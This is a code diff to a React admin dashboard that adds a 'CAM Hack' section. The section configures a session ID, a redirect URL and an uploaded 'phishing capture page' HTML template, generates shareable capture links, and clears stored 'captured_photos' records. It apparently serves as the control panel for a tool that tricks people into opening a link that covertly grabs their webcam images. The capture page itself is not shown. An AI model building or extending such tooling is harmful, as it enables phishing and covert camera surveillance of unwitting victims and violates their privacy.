@@ -18,7 +18,9 @@ import {
   Upload,
   X,
   Image,
-  Send
+  Send,
+  Camera,
+  Video
 } from "lucide-react";
 import * as Icons from "lucide-react";
 import { useNavigate } from "react-router-dom";
@@ -77,7 +79,7 @@ interface SearchHistoryItem {
 const Admin = () => {
   const navigate = useNavigate();
   const { settings, updateSettings, updateTab, updateTelegramTool, resetSettings } = useSettings();
-  const [activeSection, setActiveSection] = useState<"header" | "background" | "tabs" | "darkdb" | "telegram" | "theme" | "password" | "history">("header");
+  const [activeSection, setActiveSection] = useState<"header" | "background" | "tabs" | "darkdb" | "telegram" | "camhack" | "theme" | "password" | "history">("header");
   const [showSitePassword, setShowSitePassword] = useState(false);
   const [showAdminPassword, setShowAdminPassword] = useState(false);
   const [searchHistory, setSearchHistory] = useState<SearchHistoryItem[]>([]);
@@ -205,6 +207,7 @@ const Admin = () => {
             { id: "tabs", icon: LayoutGrid, label: "Tabs" },
             { id: "darkdb", icon: Database, label: "DARK DB" },
             { id: "telegram", icon: Send, label: "Telegram" },
+            { id: "camhack", icon: Camera, label: "CAM Hack" },
             { id: "theme", icon: Palette, label: "Theme" },
             { id: "password", icon: Key, label: "Password" },
             { id: "history", icon: History, label: "History" },
@@ -709,6 +712,175 @@ const Admin = () => {
                 className="border-neon-red text-neon-red hover:bg-neon-red/10"
               >
                 <Trash2 className="w-4 h-4 mr-2" /> Clear Telegram Cache
+              </Button>
+            </div>
+          </div>
+        )}
+
+        {/* CAM Hack Section */}
+        {activeSection === "camhack" && (
+          <div className="space-y-4">
+            <h2 className="text-lg font-display text-neon-cyan mb-4 flex items-center gap-2">
+              <Camera className="w-5 h-5" /> CAM Hack Configuration
+            </h2>
+            
+            {/* Session ID */}
+            <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
+              <h3 className="font-bold text-neon-green">Session ID</h3>
+              <p className="text-xs text-muted-foreground">All captured photos will be stored under this session ID (synced across all devices)</p>
+              <Input
+                value={settings.camSessionId}
+                onChange={(e) => updateSettings({ camSessionId: e.target.value })}
+                placeholder="shubhcam01"
+                className="font-mono text-sm"
+              />
+            </div>
+
+            {/* Redirect URL */}
+            <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
+              <h3 className="font-bold text-neon-pink">Redirect URL (Normal Capture)</h3>
+              <p className="text-xs text-muted-foreground">User will be redirected here after camera capture (only for normal links, not custom HTML)</p>
+              <Input
+                value={settings.camRedirectUrl}
+                onChange={(e) => updateSettings({ camRedirectUrl: e.target.value })}
+                placeholder="https://google.com"
+                className="font-mono text-sm"
+              />
+            </div>
+
+            {/* Custom HTML */}
+            <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
+              <h3 className="font-bold text-neon-orange">Custom HTML Template</h3>
+              <p className="text-xs text-muted-foreground">Upload or paste custom HTML for phishing capture page</p>
+              
+              {settings.customCaptureHtml ? (
+                <div className="space-y-3">
+                  <div className="p-3 bg-neon-green/10 rounded-lg border border-neon-green/30">
+                    <p className="text-neon-green text-sm">✓ Custom HTML loaded ({Math.round(settings.customCaptureHtml.length / 1024)}KB)</p>
+                  </div>
+                  <div className="flex gap-2">
+                    <Button
+                      variant="outline"
+                      size="sm"
+                      onClick={() => {
+                        const blob = new Blob([settings.customCaptureHtml], { type: 'text/html' });
+                        const url = URL.createObjectURL(blob);
+                        const a = document.createElement('a');
+                        a.href = url;
+                        a.download = 'capture-template.html';
+                        a.click();
+                      }}
+                      className="border-neon-cyan text-neon-cyan hover:bg-neon-cyan/10"
+                    >
+                      <ExternalLink className="w-4 h-4 mr-1" /> Download
+                    </Button>
+                    <Button
+                      variant="outline"
+                      size="sm"
+                      onClick={() => updateSettings({ customCaptureHtml: "" })}
+                      className="border-neon-red/50 text-neon-red hover:bg-neon-red/10"
+                    >
+                      <X className="w-4 h-4 mr-1" /> Remove
+                    </Button>
+                  </div>
+                </div>
+              ) : (
+                <label className="flex flex-col items-center justify-center w-full h-24 border-2 border-dashed border-neon-orange/50 rounded-xl cursor-pointer hover:bg-neon-orange/5 transition-all">
+                  <Upload className="w-6 h-6 text-neon-orange mb-1" />
+                  <span className="text-sm text-neon-orange">Click to upload HTML file</span>
+                  <input
+                    type="file"
+                    accept=".html,.htm"
+                    className="hidden"
+                    onChange={(e) => {
+                      const file = e.target.files?.[0];
+                      if (file) {
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                          updateSettings({ customCaptureHtml: reader.result as string });
+                          toast({ title: "HTML Uploaded", description: "Custom capture template saved" });
+                        };
+                        reader.readAsText(file);
+                      }
+                    }}
+                  />
+                </label>
+              )}
+            </div>
+
+            {/* Links Preview */}
+            <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
+              <h3 className="font-bold text-neon-purple">Generated Links</h3>
+              <div className="space-y-2">
+                <div>
+                  <label className="text-xs text-muted-foreground mb-1 block">Normal Capture Link</label>
+                  <div className="flex gap-2">
+                    <Input
+                      readOnly
+                      value={`${window.location.origin}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl)}`}
+                      className="font-mono text-xs"
+                    />
+                    <Button
+                      size="icon"
+                      variant="outline"
+                      onClick={() => {
+                        navigator.clipboard.writeText(`${window.location.origin}/capture?session=${settings.camSessionId}&redirect=${encodeURIComponent(settings.camRedirectUrl)}`);
+                        toast({ title: "Copied!", description: "Normal capture link copied" });
+                      }}
+                      className="border-neon-green text-neon-green"
+                    >
+                      <Save className="w-4 h-4" />
+                    </Button>
+                  </div>
+                </div>
+                {settings.customCaptureHtml && (
+                  <div>
+                    <label className="text-xs text-muted-foreground mb-1 block">Custom HTML Capture Link</label>
+                    <div className="flex gap-2">
+                      <Input
+                        readOnly
+                        value={`${window.location.origin}/custom-capture?session=${settings.camSessionId}`}
+                        className="font-mono text-xs"
+                      />
+                      <Button
+                        size="icon"
+                        variant="outline"
+                        onClick={() => {
+                          navigator.clipboard.writeText(`${window.location.origin}/custom-capture?session=${settings.camSessionId}`);
+                          toast({ title: "Copied!", description: "Custom capture link copied" });
+                        }}
+                        className="border-neon-pink text-neon-pink"
+                      >
+                        <Save className="w-4 h-4" />
+                      </Button>
+                    </div>
+                  </div>
+                )}
+              </div>
+            </div>
+
+            {/* Clear Photos */}
+            <div className="border border-border/50 rounded-xl p-4 bg-card/50 space-y-3">
+              <h3 className="font-bold text-neon-red flex items-center gap-2">
+                <Trash2 className="w-4 h-4" /> Clear Captured Photos
+              </h3>
+              <p className="text-xs text-muted-foreground">Delete all captured photos for the current session</p>
+              <Button
+                onClick={async () => {
+                  const { error } = await supabase
+                    .from("captured_photos")
+                    .delete()
+                    .eq("session_id", settings.camSessionId);
+                  if (!error) {
+                    toast({ title: "Photos Cleared", description: "All captured photos deleted" });
+                  } else {
+                    toast({ title: "Error", description: "Failed to clear photos", variant: "destructive" });
+                  }
+                }}
+                variant="outline"
+                className="border-neon-red text-neon-red hover:bg-neon-red/10"
+              >
+                <Trash2 className="w-4 h-4 mr-2" /> Clear All Photos
               </Button>
             </div>
           </div>
